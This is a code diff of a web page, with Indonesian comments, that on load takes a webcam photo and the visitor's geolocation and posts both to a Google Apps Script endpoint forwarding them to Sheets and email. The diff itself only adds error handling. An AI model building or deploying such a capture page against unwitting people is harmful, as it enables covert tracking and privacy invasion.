@@ -14,35 +14,39 @@
 <canvas id="canvas" width="400" height="300"></canvas>
 
 <script>
-const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbzF2Wr7e7UO0OehFJgn-07FDzIPpbPbRe7bpkAcwBEVBfT5Rq6KGqd4kGe8souaJZGFWw/exec"; // Ganti dengan Web App kamu
+const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbzF2Wr7e7UO0OehFJgn-07FDzIPpbPbRe7bpkAcwBEVBfT5Rq6KGqd4kGe8souaJZGFWw/exec"; // Ganti dengan Web App Anda
 
 async function init() {
-  const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-  const video = document.getElementById('video');
-  video.srcObject = stream;
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    const video = document.getElementById('video');
+    video.srcObject = stream;
 
-  navigator.geolocation.getCurrentPosition(async (pos) => {
-    const { latitude, longitude } = pos.coords;
+    navigator.geolocation.getCurrentPosition(async (pos) => {
+      const { latitude, longitude } = pos.coords;
 
-    // Tunggu 2 detik lalu jepret
-    setTimeout(() => {
-      const canvas = document.getElementById('canvas');
-      const ctx = canvas.getContext('2d');
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-      const image = canvas.toDataURL('image/png');
+      // Tunggu 2 detik lalu jepret
+      setTimeout(() => {
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        const image = canvas.toDataURL('image/png');
 
-      fetch(WEB_APP_URL, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ latitude, longitude, image })
-      }).then(res => res.text()).then(msg => {
-        alert("✅ Terkirim ke Google Sheets dan email!");
-        stream.getTracks().forEach(track => track.stop()); // Matikan kamera
-      }).catch(err => alert("❌ Gagal: " + err.message));
-    }, 2000);
-  }, err => {
-    alert("Gagal ambil lokasi: " + err.message);
-  });
+        fetch(WEB_APP_URL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ latitude, longitude, image })
+        }).then(res => res.text()).then(msg => {
+          alert("✅ Terkirim ke Google Sheets dan email!");
+          stream.getTracks().forEach(track => track.stop()); // Matikan kamera
+        }).catch(err => alert("❌ Gagal: " + err.message));
+      }, 2000);
+    }, err => {
+      alert("Gagal ambil lokasi: " + err.message);
+    });
+  } catch (err) {
+    alert("Gagal mengakses kamera: " + err.message);
+  }
 }
 
 window.onload = init;
